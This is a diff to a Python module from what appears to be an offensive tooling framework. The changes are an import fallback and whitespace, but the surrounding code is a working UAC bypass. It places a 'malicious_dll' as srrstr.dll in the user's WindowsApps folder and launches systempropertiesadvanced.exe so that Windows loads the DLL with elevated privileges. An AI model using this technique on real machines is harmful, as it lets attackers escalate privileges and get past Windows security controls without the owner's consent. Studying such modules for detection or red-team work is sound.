@@ -5,10 +5,10 @@
 # UAC bypass through DLL Hijacking method (systempropertiesadvanced binary)
 
 
-from module import Module
-import subprocess
-import psutil
-import copy
+try:
+    from ...module import Module
+except ImportError:
+    from module import Module
 import os
 import shutil
 
@@ -30,13 +30,13 @@ class CustomModule(Module):
     # This module must be always implemented, it is called by the run option
     def run_module(self):
         path = "C:\\Users\\" + self.args['user'] + "\\AppData\\Local\\Microsoft\\WindowsApps"
-        dst =  path + "\\srrstr.dll"
+        dst = path + "\\srrstr.dll"
         if not os.path.isdir(path):
             print("Creating path...")
             os.mkdir(path)
         
         try:
-            shutil.copy(src = self.args["malicious_dll"], dst=dst)
+            shutil.copy(src=self.args["malicious_dll"], dst=dst)
             self.run_binary("C:\\Windows\\syswow64\\systempropertiesadvanced.exe")
             print("[+] Done!")
         except Exception as e:
